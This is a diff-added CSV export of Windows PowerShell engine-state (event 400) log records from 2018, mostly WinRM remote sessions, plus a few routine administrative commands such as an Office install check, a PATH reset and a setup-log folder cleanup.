+	HostId=6bb5939b-acd4-458d-a419-abc0bc6cc7e2
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=39843d23-b2d3-4162-bc60-75831405d432
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 6:37:10 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=496ba2d8-fe48-4f18-93f0-48a00b857c85
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=8587b0d7-ac3a-4eda-9268-aacdbda4174a
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 6:37:07 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=ca9b8d89-2641-479e-98fb-93219113350b
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=572a206e-99d5-47d0-805b-15804cf36c2a
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 6:37:04 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=09224808-6bf5-422f-abde-1636768b59be
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=082731da-dcd9-4d7d-85c9-364c4ecde37a
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 6:36:16 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=adc556b8-0a10-4bc8-abac-9fac0e1de9f6
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=12462643-785f-4c49-b568-77280bb2c2e2
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 6:31:49 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=3367239b-8f30-4f1e-aec8-b9f8c6869c28
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=e666d539-477f-456c-a676-f835fdd52d52
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 6:24:46 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=131
+
+	HostName=Default Host
+	HostVersion=5.1.16299.547
+	HostId=8e85cf68-8774-404b-a318-bb14c81a638e
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=48ef19ab-16e6-4a6c-952e-f06a0d6b411f
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 6:24:46 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=103
+
+	HostName=Default Host
+	HostVersion=5.1.16299.547
+	HostId=1bef39aa-4a12-4346-86ac-2eec93bac233
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=254c81cb-71b4-4b3d-9ff2-27ebd6dd982e
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 6:24:46 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=75
+
+	HostName=Default Host
+	HostVersion=5.1.16299.547
+	HostId=c868b2be-5746-4dfa-b6dc-67a1d6d92c9f
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=91c63209-eaa3-4c54-8c57-f11e6207ec95
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 6:24:45 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=47
+
+	HostName=Default Host
+	HostVersion=5.1.16299.547
+	HostId=957b657e-b0b1-4de6-9bbf-d6f40af60d4e
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=174f086d-6aed-4c17-b80b-51f3c8c89954
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 6:24:44 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=ee627473-0999-4c35-8c0b-facea2a123c0
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=b7f1bba6-4c21-44c1-99ba-f58aa81d59f3
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 5:39:09 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=9c59e752-9f0f-4bd3-8da2-87949e0b2e4a
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=ed992ce1-69f0-4d11-a68b-98e6fc8c80db
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 5:32:48 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=cfd1e4b0-44a8-4935-ae63-6aabcaa4e924
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=2d3ef4d5-f099-4800-adae-1d0648a2187f
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 5:28:54 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=d66bbf89-e910-492a-823d-16a1cd08436a
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=eac506bf-a705-4b8a-b41a-00cccacdaa0d
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 9:19:23 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=0a82a400-e956-49ed-8f97-1ca6913c1724
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=b512ba8f-b1f9-48c4-a4b6-77a878428cdd
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 9:19:23 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=65
+
+	HostName=Default Host
+	HostVersion=5.1.16299.547
+	HostId=12329c28-caff-42e3-89b7-fdf4ff4ace4c
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=b13cf8f7-aa3e-4fc2-b55b-0cb7ac7abc2c
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 9:19:22 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=39
+
+	HostName=Default Host
+	HostVersion=5.1.16299.547
+	HostId=75915b7c-94b8-4336-a346-1ad28043ee5d
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=eac2a709-b5dc-475e-a395-9ec2ee6170c9
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 9:19:22 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=acf3c7c3-cd9b-42bc-8897-139f8d7fdd8e
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=aa499f52-b003-41d0-8c5d-d4f920b11ee6
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 9:19:21 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=65
+
+	HostName=Default Host
+	HostVersion=5.1.16299.547
+	HostId=8ed6daf1-21b4-48ae-b89f-020af167d8cc
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=86b5f939-818b-4efa-a352-2f1e640aa076
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 9:19:21 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=39
+
+	HostName=Default Host
+	HostVersion=5.1.16299.547
+	HostId=fb282cf7-f844-4ea0-abaa-fe69bd43210f
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=cbaa7be2-d5ff-4260-a1a9-ce11a708a9e8
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 9:19:19 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=09c966e0-8b43-4dcd-9f19-c04e027169ec
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=7d108bb1-0e61-4f2e-ae1d-8bf6d39a32e0
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 9:19:16 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=65
+
+	HostName=Default Host
+	HostVersion=5.1.16299.547
+	HostId=d42a90da-528d-43f1-a353-98cb74134327
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=f3d6a56e-e0a4-404f-b69f-7aeae1c4954f
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 9:19:16 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=39
+
+	HostName=Default Host
+	HostVersion=5.1.16299.547
+	HostId=9271e26c-bc88-4418-be43-e3d14ac5fe49
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=be481d14-07a0-46a0-a2bf-e82d935863f2
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 9:19:15 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=a64be593-c05a-49c4-bcbf-bfbdf64ed035
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=d211a27c-6dc6-46e5-ac7d-61a7e454215e
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 9:19:13 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=254a5010-185a-48d4-b913-6239c74d10eb
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=db833feb-553f-44a4-9923-e7b2dd4f0b00
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 9:19:08 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=13f7ad71-b1ac-48a2-93d9-43430194a8db
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=e279666b-f78f-445b-ae11-b22357f63042
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 9:08:40 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=d9ac080b-6acf-4f30-80eb-6d19ec09810f
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=d485f447-a557-44b0-8d6f-46ed4e132a9a
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/11/2018 9:55:49 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=39fa6e69-36b2-461a-a2dd-3f9b359bf8b1
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=304101f4-27ad-4c3f-8dc6-e2a5a71e5c15
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/8/2018 6:53:15 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=dbf7aaee-cf48-4ed7-b223-d17dfa326b52
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=d02ccd54-45d6-483f-8869-6d8fb2efb229
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/8/2018 6:46:15 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=32966a80-bf97-4c00-981b-78d4856b9c27
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=7d8f72c8-6dc1-47f6-b9a3-161fd1caf101
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/6/2018 5:54:01 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=843e2e14-4a88-41ee-9101-0fc60e2be808
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.98
+	RunspaceId=4f15aa94-2c9b-4468-b86f-89f020f8c28e
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"7/18/2018 3:12:36 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=9283f257-99d7-46d8-b475-f94c8f103b77
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.98
+	RunspaceId=7e477399-8add-4a8e-83da-27afdde00a89
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"7/18/2018 3:12:09 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=b6422a53-5878-4ee8-8d32-cf3fba2e674f
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.98
+	RunspaceId=7f0a0d31-7679-4148-8cc2-87bb013c4d60
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"7/7/2018 12:46:47 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=f35753b5-c170-4045-9d0a-c053876e972c
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.98
+	RunspaceId=26f3a19a-d123-43ea-9d0e-73ebe50a69e2
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"7/7/2018 12:41:17 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=19f2c8f4-3362-4ea8-a172-513b3fcd293c
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.98
+	RunspaceId=49f41828-72f9-4486-8b66-9ea5484d9a4d
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"7/7/2018 12:37:46 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=64412868-8c30-4963-bd7c-d1102a0744f3
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.98
+	RunspaceId=2b2f04ec-afa9-4699-9cfe-6d15b7f49ef2
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"7/7/2018 12:37:23 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=98bc7d4b-3662-4846-b7c3-9ae6d117d14a
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.98
+	RunspaceId=d16a735c-c9ca-4a6e-8a2f-62bb4dd51749
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"7/7/2018 12:28:50 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=d45f4d78-e0f0-4411-b01d-c34691b37c21
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.98
+	RunspaceId=5c206681-cfd5-4e5d-8ee5-12b6606714b8
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"7/7/2018 12:27:14 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=fc86e997-1db4-4cda-bf6f-440f7b3fe4f7
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.98
+	RunspaceId=191998e3-7a9a-4fc6-b38d-7a3796812af5
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"7/7/2018 12:24:50 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=bbd37829-cad0-4f91-8f37-9d86bd46d874
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.98
+	RunspaceId=923f9d0f-bc31-4917-a01c-74c08c3df174
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"7/7/2018 12:20:21 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=fa29fc50-b1e8-4b54-8547-461d1f89d615
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.98
+	RunspaceId=ac219204-9a5e-417f-ac2a-1d907a245add
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"7/7/2018 12:20:05 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=240445de-50e4-424d-a4fa-7874c46f17ca
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.98
+	RunspaceId=d433e8cb-f0d2-41cd-b1a2-5001b17fb506
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"7/7/2018 12:19:48 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=06c78543-f43a-4ece-a4a6-cf52e979c594
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.98
+	RunspaceId=f20f8c69-859f-46e0-96d2-0a74afcd5566
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"7/7/2018 12:19:30 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=1e79e6f1-97e5-47ae-873c-71d65b40806b
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.98
+	RunspaceId=7792d928-73b2-4d49-a6c8-b2e62a05865e
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"7/7/2018 12:16:12 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=a8c745ab-fd0d-40b5-a0df-91cec43b21e0
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.98
+	RunspaceId=4f1d930f-a899-4af2-a40a-a8bc65a102fb
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"7/6/2018 3:50:58 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=fd65ab35-7b8e-4085-bff1-cf47e1cffa11
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.98
+	RunspaceId=babb9155-a24a-4898-b6ba-5722a5149e5e
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"7/6/2018 4:06:27 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=0e7f4e27-352d-403b-bb17-d67f79398586
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.98
+	RunspaceId=fba75f47-f371-4567-b043-f1bf7e24c39d
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"7/6/2018 3:50:28 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=6001efac-38e8-4dd5-a85b-5d0720554f59
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.98
+	RunspaceId=2ca9bda4-b3d8-4818-b9e4-52e02d52cf18
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"7/6/2018 3:45:25 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=7aa92c52-83c8-467a-a837-824844291c11
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.98
+	RunspaceId=3cc48e96-d660-46a4-9d09-0fc778d0d615
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"5/25/2018 1:48:41 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.16299.98
+	HostId=e7b3e7ca-ef2e-4464-b3f7-97c6d3ca4674
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=5.1.16299.98
+	RunspaceId=856fce3a-3947-46f0-8baf-06e147ee0b2b
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"5/14/2018 7:19:33 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.16299.98
+	HostId=a9638e50-7b5d-4ac9-8a21-53bd61fb16a6
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command & { $isOfficeInstalled = Get-AppxPackage Microsoft.Office.Desktop -allusers; if ($isOfficeInstalled -eq $null) { Out-File -FilePath 'C:\Users\ADMINI~1.SHI\AppData\Local\Temp\Centennial.Detection.IsCentennialOfficeInstalled.scratch' -InputObject '0' -Encoding ascii; } else { Out-File -FilePath 'C:\Users\ADMINI~1.SHI\AppData\Local\Temp\Centennial.Detection.IsCentennialOfficeInstalled.scratch' -InputObject '1' -Encoding ascii } }
+	EngineVersion=5.1.16299.98
+	RunspaceId=72b4bbd2-cca5-4928-90e5-0aeb5404a2be
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"5/5/2018 12:14:26 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.16299.98
+	HostId=c6c3bf3a-3d7c-4ad2-8014-34c16830f5f0
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell -NoProfile -ExecutionPolicy unrestricted -Command Set-ItemProperty -Path 'Registry::HKLM\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH -Type ExpandString -Value (Get-ItemProperty -Path 'Registry::HKLM\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH).Path
+	EngineVersion=5.1.16299.98
+	RunspaceId=f92baf37-366c-4be8-a6f9-47b1369e5585
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"5/5/2018 12:14:16 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.16299.98
+	HostId=901e9f77-bbda-46e8-b48d-ebec281834f3
+	HostApplication=powershell -NoProfile -ExecutionPolicy unrestricted -Command rmdir -recurse C:\Windows\Panther >$null 2>&1
+	EngineVersion=5.1.16299.98
+	RunspaceId=4dd37534-27c1-44ed-ad1f-ceca58d77d52
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
